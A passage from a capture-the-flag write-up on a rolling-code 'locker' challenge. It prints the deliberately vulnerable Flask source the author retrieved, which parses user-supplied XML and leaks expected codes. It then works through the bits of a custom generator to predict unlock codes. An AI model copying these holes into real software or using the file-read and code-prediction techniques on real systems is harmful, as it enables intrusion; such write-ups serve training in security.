+<span class=code-white>Pragma</span>: no-cache
+<span class=code-white>Expires</span>: 0
+</code></pre></div>
+<p>And so, we can guess that the principal file for the back-end source code is <code>app.py</code>, <code>main.py</code>, <code>index.py</code> or <code>server.py</code>. And for directories, we may try with <code>/app</code> (usual in Docker containers). In the end, what works is <code>/app/main.py</code>. This is the file:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>import</span> <span class="mtk8 mtku">json</span><span class=mtk1>,</span> <span class="mtk8 mtku">os</span><span class=mtk1>,</span> <span class="mtk8 mtku">time,</span> <span class="mtk8 mtku">xml</span><span class=mtk1>.</span><span class="mtk8 mtku">sax</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">flask</span> <span class=mtk5>import</span> <span class="mtk8 mtku">Flask</span><span class=mtk1>,</span> <span class=mtk8>redirect</span><span class=mtk1>,</span> <span class=mtk1>request</span>
+<span class=mtk5>from</span> <span class="mtk8 mtku">jinja2</span> <span class=mtk5>import</span> <span class="mtk8 mtku">Template</span>
+<span class=mtk5>from</span> <span class="mtk8 mtku">cStringIO</span> <span class=mtk5>import</span> <span class="mtk8 mtku">StringIO</span>
+
+<span class=mtk5>from</span> <span class=mtk1>rng</span> <span class=mtk5>import *</span>
+
+<span class=mtk3>#</span> <span class=mtk3>^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$</span>
+
+<span class=mtk1>flags</span> <span class=mtk5>=</span> <span class="mtk8 mtku">json</span><span class=mtk1>.</span><span class=mtk8>loads</span><span class=mtk1>(</span><span class="mtk8 mtku">os</span><span class=mtk1>.</span><span class=mtk8>getenv</span><span class=mtk1>(</span><span class=mtk4>'FLAGS'</span><span class=mtk1>))</span>
+<span class="mtk8 mtku">os</span><span class=mtk1>.unsetenv(</span><span class=mtk4>'FLAGS'</span><span class=mtk1>)</span>
+
+<span class=mtk1>app</span> <span class=mtk5>=</span> <span class="mtk8 mtku">Flask</span><span class=mtk1>(</span><span class=mtk1>__name__</span><span class=mtk1>)</span>
+
+<span class=mtk1>templateCache</span> <span class=mtk5>=</span> <span class=mtk1>{}</span>
+<span class="mtk7 mtki">def</span> <span class=mtk8>render</span><span class=mtk1>(</span><span class="mtk9 mtki">tpl</span><span class=mtk1>,</span> <span class=mtk5>**</span><span class="mtk9 mtki">kwargs</span><span class=mtk1>):</span>
+    <span class=mtk5>if</span> <span class="mtk9 mtki">tpl</span> <span class=mtk5>not</span> <span class=mtk5>in</span> <span class=mtk1>templateCache</span><span class=mtk1>:</span>
+        <span class=mtk1>templateCache</span><span class=mtk1>[</span><span class="mtk9 mtki">tpl</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class="mtk8 mtku">Template</span><span class=mtk1>(file(</span><span class=mtk4>'templates/</span><span class=mtk6>%s</span><span class=mtk4>.html'</span> <span class=mtk5>%</span> <span class="mtk9 mtki">tpl</span><span class=mtk1>).read())</span>
+    <span class=mtk5>return</span> <span class=mtk1>templateCache</span><span class=mtk1>[</span><span class="mtk9 mtki">tpl</span><span class=mtk1>].render(</span><span class=mtk5>**</span><span class="mtk9 mtki">kwargs</span><span class=mtk1>)</span>
+
+<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>after_request</span>
+<span class="mtk7 mtki">def</span> <span class=mtk8>add_header</span><span class=mtk1>(</span><span class="mtk9 mtki">r</span><span class=mtk1>):</span>
+    <span class="mtk9 mtki">r</span><span class=mtk1>.headers[</span><span class=mtk4>"Cache-Control"</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>"no-cache,</span> <span class=mtk4>no-store,</span> <span class=mtk4>must-revalidate"</span>
+    <span class="mtk9 mtki">r</span><span class=mtk1>.headers[</span><span class=mtk4>"Pragma"</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>"no-cache"</span>
+    <span class="mtk9 mtki">r</span><span class=mtk1>.headers[</span><span class=mtk4>"Expires"</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>"0"</span>
+    <span class="mtk9 mtki">r</span><span class=mtk1>.headers[</span><span class=mtk4>'Cache-Control'</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>'public,</span> <span class=mtk4>max-age=0'</span>
+    <span class=mtk5>return</span> <span class="mtk9 mtki">r</span>
+
+<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/'</span><span class=mtk1>)</span>
+<span class="mtk7 mtki">def</span> <span class=mtk8>index</span><span class=mtk1>():</span>
+    <span class=mtk5>return</span> <span class=mtk8>render</span><span class=mtk1>(</span><span class=mtk4>'home'</span><span class=mtk1>)</span>
+
+<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/unlock'</span><span class=mtk1>,</span> <span class="mtk9 mtki">methods</span><span class=mtk5>=</span><span class=mtk1>[</span><span class=mtk4>'POST'</span><span class=mtk1>])</span>
+<span class="mtk7 mtki">def</span> <span class=mtk8>unlock</span><span class=mtk1>():</span>
+    <span class=mtk1>code</span> <span class=mtk5>=</span> <span class="mtk7 mtki">int</span><span class=mtk1>(</span><span class=mtk1>request</span><span class=mtk1>.</span><span class=mtk8>form</span><span class=mtk1>[</span><span class=mtk4>'code'</span><span class=mtk1>])</span>
+    <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk8>next</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>)</span>
+    <span class="mtk8 mtku">time</span><span class=mtk1>.sleep(</span><span class=mtk6>5</span><span class=mtk1>)</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>code</span> <span class=mtk5>==</span> <span class=mtk1>cur</span><span class=mtk1>:</span>
+        <span class=mtk5>return</span> <span class=mtk4>'Unlocked</span> <span class=mtk4>successfully.</span>  <span class=mtk4>Flag:</span> <span class=mtk4>'</span> <span class=mtk5>+</span> <span class=mtk1>flags</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>]</span>
+    <span class=mtk5>else</span><span class=mtk1>:</span>
+        <span class=mtk5>return</span> <span class=mtk4>'Code</span> <span class=mtk4>incorrect.</span>  <span class=mtk4>Expected</span> <span class=mtk6>%08i</span><span class=mtk4>'</span> <span class=mtk5>%</span> <span class=mtk1>cur</span>
+
+<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/admin'</span><span class=mtk1>)</span>
+<span class="mtk7 mtki">def</span> <span class=mtk8>admin</span><span class=mtk1>():</span>
+    <span class=mtk5>return</span> <span class=mtk8>render</span><span class=mtk1>(</span><span class=mtk4>'admin'</span><span class=mtk1>,</span> <span class="mtk9 mtki">location</span><span class=mtk5>=</span><span class=mtk1>location</span><span class=mtk1>)</span>
+
+<span class=mtk1>location</span> <span class=mtk5>=</span> <span class=mtk4>'Front</span> <span class=mtk4>door'</span>
+
+<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/get-config'</span><span class=mtk1>)</span>
+<span class="mtk7 mtki">def</span> <span class=mtk8>getConfig</span><span class=mtk1>():</span>
+    <span class=mtk5>return</span> <span class=mtk4>'&lt;?xml</span> <span class=mtk4>version="1.0"</span> <span class=mtk4>encoding="UTF-8"?&gt;&lt;config&gt;&lt;location&gt;</span><span class=mtk6>%s</span><span class=mtk4>&lt;/location&gt;&lt;/config&gt;'</span> <span class=mtk5>%</span> <span class=mtk1>location</span>  
+
+<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">Handler</span><span class=mtk1>(</span><span class="mtk8 mtku">xml</span><span class=mtk1>.</span><span class="mtk8 mtku">sax</span><span class=mtk1>.</span><span class="mtk8 mtku">ContentHandler</span><span class=mtk1>):</span>
+    <span class="mtk7 mtki">def</span> <span class=mtk7>__init__</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>):</span>
+        <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span> <span class=mtk5>=</span> <span class=mtk6>None</span>
+    <span class="mtk7 mtki">def</span> <span class=mtk8>startElement</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>,</span> <span class="mtk9 mtki">name</span><span class=mtk1>,</span> <span class="mtk9 mtki squiggly-inline-unnecessary">attrs</span><span class=mtk1>):</span>
+        <span class=mtk5>if</span> <span class="mtk9 mtki">name</span> <span class=mtk5>==</span> <span class=mtk4>'location'</span><span class=mtk1>:</span>
+            <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span> <span class=mtk5>=</span> <span class=mtk4>''</span>
+    <span class="mtk7 mtki">def</span> <span class=mtk8>endElement</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>,</span> <span class="mtk9 mtki">name</span><span class=mtk1>):</span>
+        <span class=mtk5>if</span> <span class="mtk9 mtki">name</span> <span class=mtk5>==</span> <span class=mtk4>'location'</span><span class=mtk1>:</span>
+            <span class=mtk5>global</span> <span class=mtk1>location</span>
+            <span class=mtk1>location</span> <span class=mtk5>=</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span>
+            <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span> <span class=mtk5>=</span> <span class=mtk6>None</span>
+    <span class="mtk7 mtki">def</span> <span class=mtk8>characters</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>,</span> <span class="mtk9 mtki">content</span><span class=mtk1>):</span>
+        <span class=mtk5>if</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span> <span class=mtk5>is</span> <span class=mtk5>not</span> <span class=mtk6>None</span><span class=mtk1>:</span>
+            <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>location</span> <span class=mtk5>+=</span> <span class="mtk9 mtki">content</span>
+
+<span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/set-config'</span><span class=mtk1>)</span>
+<span class="mtk7 mtki">def</span> <span class=mtk8>setConfig</span><span class=mtk1>():</span>
+    <span class=mtk1>data</span> <span class=mtk5>=</span> <span class=mtk1>request</span><span class=mtk1>.</span><span class=mtk8>args</span><span class=mtk1>[</span><span class=mtk4>'data'</span><span class=mtk1>]</span>
+    <span class=mtk1>parser</span> <span class=mtk5>=</span> <span class="mtk8 mtku">xml</span><span class=mtk1>.</span><span class="mtk8 mtku">sax</span><span class=mtk1>.</span><span class=mtk8>make_parser</span><span class=mtk1>()</span>
+    <span class=mtk1>parser</span><span class=mtk1>.setContentHandler(</span><span class="mtk8 mtku">Handler</span><span class=mtk1>())</span>
+    <span class=mtk1>parser</span><span class=mtk1>.parse(</span><span class="mtk8 mtku">StringIO</span><span class=mtk1>(</span><span class=mtk1>data</span><span class=mtk1>))</span>
+    <span class=mtk5>return</span> <span class=mtk8>redirect</span><span class=mtk1>(</span><span class=mtk4>'admin'</span><span class=mtk1>)</span>
+
+<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>run</span><span class=mtk1>(</span><span class="mtk9 mtki">host</span><span class=mtk5>=</span><span class=mtk4>'0.0.0.0'</span><span class=mtk1>,</span> <span class="mtk9 mtki">port</span><span class=mtk5>=</span><span class=mtk6>80</span><span class=mtk1>)</span>
+</code></pre></div>
+<p>The file contains a comment with the first flag.</p>
+<p>Now we can analyze the function that handles the locker shown on the main website:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>@</span><span class=mtk1>app</span><span class=mtk8>.</span><span class=mtk8>route</span><span class=mtk1>(</span><span class=mtk4>'/unlock'</span><span class=mtk1>,</span> <span class="mtk9 mtki">methods</span><span class=mtk5>=</span><span class=mtk1>[</span><span class=mtk4>'POST'</span><span class=mtk1>])</span>
+<span class="mtk7 mtki">def</span> <span class=mtk8>unlock</span><span class=mtk1>():</span>
+    <span class=mtk1>code</span> <span class=mtk5>=</span> <span class="mtk7 mtki">int</span><span class=mtk1>(</span><span class=mtk1>request</span><span class=mtk1>.</span><span class=mtk8>form</span><span class=mtk1>[</span><span class=mtk4>'code'</span><span class=mtk1>])</span>
+    <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk8>next</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>)</span>
+    <span class="mtk8 mtku">time</span><span class=mtk1>.sleep(</span><span class=mtk6>5</span><span class=mtk1>)</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>code</span> <span class=mtk5>==</span> <span class=mtk1>cur</span><span class=mtk1>:</span>
+        <span class=mtk5>return</span> <span class=mtk4>'Unlocked</span> <span class=mtk4>successfully.</span>  <span class=mtk4>Flag:</span> <span class=mtk4>'</span> <span class=mtk5>+</span> <span class=mtk1>flags</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>]</span>  
+    <span class=mtk5>else</span><span class=mtk1>:</span>
+        <span class=mtk5>return</span> <span class=mtk4>'Code</span> <span class=mtk4>incorrect.</span>  <span class=mtk4>Expected</span> <span class=mtk6>%08i</span><span class=mtk4>'</span> <span class=mtk5>%</span> <span class=mtk1>cur</span>
+</code></pre></div>
+<p>The function called <code>next</code> is not the built-in one. In fact it is taken from <code>rng</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>from</span> <span class=mtk1>rng</span> <span class=mtk5>import *</span>
+</code></pre></div>
+<p>So there must be a file called <code>rng.py</code>, which is this one:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>import</span> <span class="mtk8 mtku">random</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>setup</span><span class=mtk1>(</span><span class="mtk9 mtki">seed</span><span class=mtk1>):</span>
+    <span class=mtk5>global</span> <span class=mtk1>state</span>
+
+    <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk6>0</span>
+
+    <span class=mtk5>for</span> <span class="mtk1 squiggly-inline-unnecessary">i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>16</span><span class=mtk1>):</span>
+        <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class="mtk9 mtki">seed</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span>
+        <span class="mtk9 mtki">seed</span> <span class=mtk5>&gt;&gt;=</span> <span class=mtk6>2</span>
+        <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>4</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>cur</span><span class=mtk1>)</span>
+        <span class=mtk1>state</span> <span class=mtk5>|=</span> <span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>2</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>next</span><span class=mtk1>(</span><span class="mtk9 mtki">bits</span><span class=mtk1>):</span>
+    <span class=mtk5>global</span> <span class=mtk1>state</span>
+
+    <span class=mtk1>ret</span> <span class=mtk5>=</span> <span class=mtk6>0</span>
+
+    <span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class="mtk9 mtki">bits</span><span class=mtk1>):</span>
+        <span class=mtk1>ret</span> <span class=mtk5>&lt;&lt;=</span> <span class=mtk6>1</span>
+        <span class=mtk1>ret</span> <span class=mtk5>|=</span> <span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>1</span>
+
+        <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>61</span><span class=mtk1>)</span>
+        <span class=mtk1>state</span> <span class=mtk5>&amp;=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>FFFFFFFFFFFFFFFF</span>
+        <span class=mtk1>state</span> <span class=mtk5>^=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>FFFFFFFFFFFFFFFF</span>
+
+        <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>64</span><span class=mtk1>,</span> <span class=mtk6>4</span><span class=mtk1>):</span>
+            <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk1>j</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class="mtk7 mtki">0x</span><span class=mtk6>F</span>
+            <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>cur</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>8</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>4</span><span class=mtk1>)</span>  
+            <span class=mtk1>state</span> <span class=mtk5>^=</span> <span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk1>j</span>
+
+    <span class=mtk5>return</span> <span class=mtk1>ret</span>
+
+
+<span class=mtk8>setup</span><span class=mtk1>((</span><span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>)</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>16</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>))</span>  
+</code></pre></div>
+<p>This file is used to generate the rolling codes. We must obtain the next code provided one or more previous codes, or at least extract the initial seed in order to be able to generate valid rolling codes for the lock.</p>
+<p>The script is using three important variables:</p>
+<ul>
+<li><code>seed</code>: The initial seed. It is completely random, and it is computed as:</li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>seed </span><span class=mtk5>=</span> (</span><span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>)</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>16</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randrange</span><span class=mtk1>(</span><span class="mtk7 mtki">0x</span><span class=mtk6>10000</span><span class=mtk1>)</span>  
+</code></pre></div>
+<ul>
+<li><code>ret</code>: It is the next rolling code. It is computed using a <code>state</code> variable. Basically, it is taking the last bit of <code>state</code> and putting it at the end of <code>ret</code> during 26 iterations. However, <code>state</code> changes on each iteration:</li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>ret</span> <span class=mtk5>=</span> <span class=mtk6>0</span>
+
+<span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>):</span>
+    <span class=mtk1>ret</span> <span class=mtk5>&lt;&lt;=</span> <span class=mtk6>1</span>
+    <span class=mtk1>ret</span> <span class=mtk5>|=</span> <span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>1</span>
+
+    <span class=mtk3># Changes in state</span>  
+</code></pre></div>
+<ul>
+<li><code>state</code>: It is initially generated by the <code>seed</code> as:</li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk6>0</span>
+
+<span class=mtk5>for</span> <span class="mtk1 squiggly-inline-unnecessary">i</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>16</span><span class=mtk1>):</span>
+    <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class="mtk9 mtki">seed</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span>
+    <span class="mtk9 mtki">seed</span> <span class=mtk5>&gt;&gt;=</span> <span class=mtk6>2</span>
+    <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>4</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>state</span> <span class=mtk5>&amp;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>cur</span><span class=mtk1>)</span>
+    <span class=mtk1>state</span> <span class=mtk5>|=</span> <span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>2</span>
+</code></pre></div>
+<p>But this is not useful since the <code>seed</code> is random. We see that the <code>state</code> changes on each execution of <code>next</code>, and actually, on each of the 26 iterations within a single call to <code>next</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>for</span> <span class=mtk1>_</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>26</span><span class=mtk1>):</span>
+    <span class=mtk3># Changes in ret</span> 
+
+    <span class=mtk1>state</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk5>^</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>61</span><span class=mtk1>)</span>
+    <span class=mtk1>state</span> <span class=mtk5>&amp;=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>FFFFFFFFFFFFFFFF</span>
+    <span class=mtk1>state</span> <span class=mtk5>^=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>FFFFFFFFFFFFFFFF</span>
+
+    <span class=mtk5>for</span> <span class=mtk1>j</span> <span class=mtk5>in</span> <span class="mtk8 mtku">range</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>64</span><span class=mtk1>,</span> <span class=mtk6>4</span><span class=mtk1>):</span>
+        <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>state</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk1>j</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class="mtk7 mtki">0x</span><span class=mtk6>F</span>
+        <span class=mtk1>cur</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class=mtk1>cur</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&gt;&gt;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>8</span><span class=mtk1>)</span> <span class=mtk5>|</span> <span class=mtk1>((</span><span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span> <span class=mtk6>4</span><span class=mtk1>)</span>  
+        <span class=mtk1>state</span> <span class=mtk5>^=</span> <span class=mtk1>cur</span> <span class=mtk5>&lt;&lt;</span> <span class=mtk1>j</span>
+</code></pre></div>
+<p>First, we have this operation (using a 64-bit integer as an array of bits):</p>
+<p>$$
+\mathrm{state} = [s_{63}, s_{62}, s_{61}, s_{60}, \dots, s_2, s_1, s_0]
+$$</p>
+<p>$$
+\mathrm{state} = [s_{62}, s_{61}, s_{60}, \dots, s_2, s_1, s_0, 0] \hat{} [0, 0, 0, \dots, 0, s_{63}, s_{62}, s_{61}]
+$$</p>
+<p>$$
+\mathrm{state} = [s_{62}, s_{61}, s_{60}, \dots, s_2, (s_1 \hat{} s_{63}), (s_0 \hat{} s_{62}), s_{61}]
+$$</p>
+<p>$$
+\mathrm{state} = [\overline{s_{62}}, \overline{s_{61}}, \overline{s_{60}}, \dots, \overline{s_2}, \overline{(s_1 \hat{} s_{63})}, \overline{(s_0 \hat{} s_{62})}, \overline{s_{61}}]
+$$</p>
+<p>And now, we have operations for every 4 bits of <code>state</code> (set into <code>cur</code>). For example:</p>
+<p>$$
+\mathrm{cur} = [s_3, s_2, s_1, s_0]
+$$</p>
+<p>$$
+\mathrm{cur} = [0, 0, 0, s_3] \quad|\quad [0, 0, s_3, 0] \quad|\quad [s_0, 0, 0, 0] \quad|\quad [0, s_0, 0, 0]
+$$</p>
+<p>$$
+\mathrm{cur} = [s_0, s_0, s_3, s_3]
+$$</p>
+<p>$$
+\mathrm{state}[3..0] = [s_3, s_2, s_1, s_0] \hat{} [s_0, s_0, s_3, s_3]
+$$</p>
+<p>So that the <code>state</code> is changed like this:</p>
+<p>$$
+\mathrm{state}[3..0] = [(s_3 \hat{} s_0), (s_2 \hat{} s_0), (s_1 \hat{} s_3), (s_0 \hat{} s_3)]
+$$</p>
+<p>And therefore, the whole <code>state</code> variable changes in this way (notice that in every quartet, the first and last bits are equal):</p>
+<p>$$
+\mathrm{state}[63..60] = [(s_{63} \hat{} s_{60}), (s_{62} \hat{} s_{60}), (s_{61} \hat{} s_{63}), (s_{60} \hat{} s_{63})]
+$$</p>
+<p>$$
+\mathrm{state}[59..56] = [(s_{59} \hat{} s_{56}), (s_{58} \hat{} s_{56}), (s_{59} \hat{} s_{59}), (s_{56} \hat{} s_{59})]
+$$</p>
+<p>$$
+\dots
+$$</p>
+<p>$$
+\mathrm{state}[3..0] = [(s_3 \hat{} s_0), (s_2 \hat{} s_0), (s_1 \hat{} s_3), (s_0 \hat{} s_3)]
+$$</p>
+<p>Finally, if we join both stages for the change in <code>state</code> we have this:</p>
+<p>$$
+\mathrm{state} = [s_{63}, s_{62}, s_{61}, s_{60}, \dots, s_2, s_1, s_0]
+$$</p>
+<p>And the next <code>state</code> will be:</p>
+<p>$$
+\mathrm{state} = [(\overline{s_{62}} \hat{} \overline{s_{59}}), (\overline{s_{61}} \hat{} \overline{s_{59}}), (\overline{s_{60}} \hat{} \overline{s_{62}}), (\overline{s_{59}} \hat{} \overline{s_{62}}),
+$$</p>
+<p>$$
+(\overline{s_{58}} \hat{} \overline{s_{55}}), (\overline{s_{57}} \hat{} \overline{s_{55}}), (\overline{s_{56}} \hat{} \overline{s_{58}}), (\overline{s_{55}} \hat{} \overline{s_{58}}),
+$$</p>
+<p>$$
+\dots
+$$</p>
+<p>$$
+(\overline{s_6} \hat{} \overline{s_3}), (\overline{s_5} \hat{} \overline{s_3}), (\overline{s_4} \hat{} \overline{s_6}), (\overline{s_3} \hat{} \overline{s_6}),
+$$</p>
+<p>$$
+(\overline{s_2} \hat{} \overline{s_{61}}), (\overline{(s_1 \hat{} s_{63})} \hat{} \overline{s_{61}}), (\overline{(s_0 \hat{} s_{62})} \hat{} \overline{s_2}), (\overline{s_{61}} \hat{} \overline{s_2})]
+$$</p>
+<p>Notice that $\overline{a} \hat{} \overline{b} = a \hat{} b$, so the next <code>state</code> can be simplified to:</p>
+<p>$$
+\mathrm{state} = [(s_{59} \hat{} s_{62}), (s_{59} \hat{} s_{61}), (s_{60} \hat{} s_{62}), (s_{59} \hat{} s_{62}),
+$$</p>
+<p>$$
+(s_{55} \hat{} s_{58}), (s_{55} \hat{} s_{57}), (s_{56} \hat{} s_{58}), (s_{55} \hat{} s_{58}),
+$$</p>
+<p>$$
+\dots
+$$</p>
+<p>$$
